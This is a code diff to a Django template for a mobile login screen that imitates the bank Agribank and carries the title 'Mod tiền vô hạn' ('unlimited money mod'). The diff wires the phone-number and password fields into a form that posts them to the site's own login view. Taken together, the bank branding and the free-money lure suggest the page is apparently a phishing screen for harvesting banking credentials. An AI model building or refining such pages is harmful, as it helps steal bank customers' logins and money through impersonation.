@@ -15,7 +15,7 @@
             <div class="phone__header">.</div>
             <div class="phone__main">
                 <div>
-                    <div class='back'>X</div>
+                    <div class='back'>✖</div>
                     <div class='name'>
                         <i class="fas fa-university"></i>
                         <span>AGRIBANK Mod tiền vô hạn</span>
@@ -23,16 +23,20 @@
                     <div class='name__screen'>
                         Đăng nhập
                     </div>
-                    <div>
-                        <input class='input' placeholder="Số điện thoại                           0**********9"/>
-                        <div class='vach'>.</div>
-                        <input class='input' placeholder="Mật khẩu"/>
-                        <div class='vach'>.</div>
-                    </div>
-                    <div class='xacthuc'>
-                        <div class='button'>Đăng nhập</div>
-                        <i class="fas fa-fingerprint vt"></i>
-                    </div>
+                    <form method="post"  action="{% url 'home:login' %}">
+                        {% csrf_token %}
+                            <div>
+                                <input class='input' name="userName" placeholder="Số điện thoại                           0**********9"/>
+                                <div class='vach'>.</div>
+                                <input class='input' name="password" placeholder="Mật khẩu"/>
+                                <div class='vach'>.</div>
+                            </div>
+                            <div class='xacthuc'>
+                                <button class='button' type="submit">Đăng nhập</button>
+                                <i class="fas fa-fingerprint vt"></i>
+                            </div>
+                    </form>
+                    
                     <div class='qmk'>
                         Quên mật khẩu ?
                     </div>
